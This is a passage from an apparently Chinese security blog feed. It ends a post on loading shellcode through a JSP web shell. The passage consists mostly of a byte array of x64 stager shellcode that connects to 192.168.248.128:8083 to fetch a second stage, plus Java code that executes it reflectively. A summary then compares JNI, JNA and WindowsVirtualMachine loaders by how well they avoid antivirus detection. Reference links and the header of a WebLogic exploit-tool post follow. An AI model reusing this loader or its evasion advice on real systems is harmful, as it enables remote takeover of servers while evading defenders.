<span class="hljs-number">0x5a</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4d</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4d</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc9</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x53</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x53</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x49</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xba</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x3a</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x56</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x79</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xa7</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xff</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd5</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe8</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x10</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x39</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x32</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x2e</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x36</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x38</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x2e</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x32</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x34</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x38</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x2e</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x32</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x38</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x5a</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x89</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x49</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc7</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x93</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x1f</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4d</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x53</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x53</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x6a</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x03</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x53</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x49</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xba</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x57</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x89</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x9f</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc6</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xff</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd5</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe8</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x2b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x2f</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x49</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x6f</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x71</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x77</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x38</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x68</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x51</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x54</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x78</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x50</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x54</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x73</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x76</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x55</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x71</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x45</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x7a</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x77</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x77</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x62</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4d</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x5a</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x6f</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x34</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x36</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x44</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x76</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x45</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x33</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x46</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x75</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x42</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x6a</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x70</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x58</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x62</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x89</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x53</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x5a</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x58</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4d</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x53</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xb8</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x02</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x28</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x84</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x50</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x53</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x53</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x49</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc7</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc2</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xeb</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x55</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x2e</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x3b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xff</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd5</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x89</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc6</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x6a</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x0a</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x5f</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x53</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x5a</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x89</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xf1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4d</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4d</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x53</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x53</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x49</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc7</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc2</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x2d</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x06</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x18</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x7b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xff</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd5</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x85</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x75</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x1f</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc7</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x88</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x13</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x49</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xba</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x44</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xf0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x35</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe0</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xff</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd5</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xff</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xcf</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x74</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x02</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xeb</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xcc</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe8</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x55</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x53</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x59</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x6a</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x40</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x5a</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x49</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x89</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe2</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x10</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x49</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc7</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc0</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x10</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x49</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xba</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x58</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xa4</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x53</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe5</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xff</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd5</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x93</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x53</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x53</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x89</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe7</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x89</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xf1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x89</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xda</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x49</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc7</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc0</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x20</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x49</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x89</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xf9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x49</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xba</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x12</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x96</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x89</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe2</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xff</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd5</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x83</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc4</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x20</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x85</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x74</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xb2</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x66</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x07</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc3</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x85</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x75</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd2</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x58</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc3</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x58</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x6a</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x59</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x49</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc7</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc2</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xf0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xb5</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xa2</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x56</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xff</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd5</span><br>                &#125;;<br><br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        byteArrayOutputStream.write(buf);<br><br><br>    <br>        <span class="hljs-keyword">byte</span>[] result = byteArrayOutputStream.toByteArray();<br><br>        Method method = clazz.getDeclaredMethod(<span class="hljs-string">&quot;run&quot;</span>, <span class="hljs-keyword">byte</span>[].class);<br>        method.invoke(clazz, result);<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        e.printStackTrace();<br>    &#125;<br>%&gt;<br><br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/XYZy36"><img src="https://s1.ax1x.com/2022/06/01/XYZy36.png" alt="XYZy36.png"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul><li><p>JNI：需要自己写一个dll文件，实现执行shellcode的功能，然后java中调用这个dll的导出函数。缺点是需要落地自己的dll文件</p></li><li><p>JNA：直接使用c的函数，可参考项目：<a href="https://github.com/yzddmr6/Java-Shellcode-Loader%E3%80%82%E9%9C%80%E8%A6%81%E8%87%AA%E5%B7%B1%E9%9B%86%E6%88%90jna%E7%9A%84%E5%8C%85%EF%BC%8C%E4%BD%93%E7%A7%AF%E5%BE%88%E5%A4%A7%E3%80%82jna%E8%B0%83%E7%94%A8dll%E6%96%87%E4%BB%B6%E7%9A%84%E8%BF%87%E7%A8%8B%E4%B8%AD%E4%B9%9F%E4%BC%9A%E7%94%9F%E6%88%90%E4%B8%80%E4%B8%AAjni%E7%9A%84dll%E6%96%87%E4%BB%B6%EF%BC%8C%E5%AE%B9%E6%98%93%E8%A2%AB%E6%9F%A5%E6%9D%80">https://github.com/yzddmr6/Java-Shellcode-Loader。需要自己集成jna的包，体积很大。jna调用dll文件的过程中也会生成一个jni的dll文件，容易被查杀</a></p><p>可以打包成jar包，上传以后加载</p></li><li><p>JVM（WindowsVirtualMachine）：因为使用了原生方法所以效果比较好，不用落地dll文件，利用的dll文件经过数字签名，payload的体积比较小。</p></li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://mp.weixin.qq.com/s/p74WQwOfkSSZlsuRDke8jw">https://mp.weixin.qq.com/s/p74WQwOfkSSZlsuRDke8jw</a></p><p><a href="https://forum.butian.net/share/143">https://forum.butian.net/share/143</a></p><p><a href="https://cangqingzhe.github.io/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/">https://cangqingzhe.github.io/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/</a></p><p><a href="https://paper.seebug.org/1853/">https://paper.seebug.org/1853/</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzU1NjgzOTAyMg==&amp;mid=2247497550&amp;idx=1&amp;sn=a25faff2fccae13255a6e18a1c6deaf1&amp;chksm=fc3c4e4fcb4bc759df11608f793a81d3d9817c1f646f9f86efb19bc1fc2e68fdeaa16006ce97&amp;mpshare=1&amp;scene=23&amp;srcid=06011m7hLsYLt7qmInNqQqxN&amp;sharer_sharetime=1654051363780&amp;sharer_shareid=1466280195c16e7f9e513da557e7e552#rd">http://mp.weixin.qq.com/s?__biz=MzU1NjgzOTAyMg==&amp;mid=2247497550&amp;idx=1&amp;sn=a25faff2fccae13255a6e18a1c6deaf1&amp;chksm=fc3c4e4fcb4bc759df11608f793a81d3d9817c1f646f9f86efb19bc1fc2e68fdeaa16006ce97&amp;mpshare=1&amp;scene=23&amp;srcid=06011m7hLsYLt7qmInNqQqxN&amp;sharer_sharetime=1654051363780&amp;sharer_shareid=1466280195c16e7f9e513da557e7e552#rd</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzIyMjkzMzY4Ng==&amp;mid=2247493429&amp;idx=1&amp;sn=01aefc873f3791ef0e0fc95a46201f0b&amp;chksm=e82740ecdf50c9faea76becdface05b4d8c4ed1eff9bf6b287b35f6b5a2611260e33b47fbe5b&amp;mpshare=1&amp;scene=23&amp;srcid=0601CBVfVDLXo2UvqQ4rnZPj&amp;sharer_sharetime=1654051422940&amp;sharer_shareid=1466280195c16e7f9e513da557e7e552#rd">http://mp.weixin.qq.com/s?__biz=MzIyMjkzMzY4Ng==&amp;mid=2247493429&amp;idx=1&amp;sn=01aefc873f3791ef0e0fc95a46201f0b&amp;chksm=e82740ecdf50c9faea76becdface05b4d8c4ed1eff9bf6b287b35f6b5a2611260e33b47fbe5b&amp;mpshare=1&amp;scene=23&amp;srcid=0601CBVfVDLXo2UvqQ4rnZPj&amp;sharer_sharetime=1654051422940&amp;sharer_shareid=1466280195c16e7f9e513da557e7e552#rd</a></p><p><a href="https://tttang.com/archive/1436/">https://tttang.com/archive/1436/</a></p><p><a href="https://www.4hou.com/posts/Qgz0">https://www.4hou.com/posts/Qgz0</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>WeblogicExploit-GUI weblogic漏洞利用图形化工具</title>
    <link href="/2022/04/20/WeblogicExploit-GUI-weblogic%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9B%BE%E5%BD%A2%E5%8C%96%E5%B7%A5%E5%85%B7/"/>
    <url>/2022/04/20/WeblogicExploit-GUI-weblogic%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9B%BE%E5%BD%A2%E5%8C%96%E5%B7%A5%E5%85%B7/</url>
    
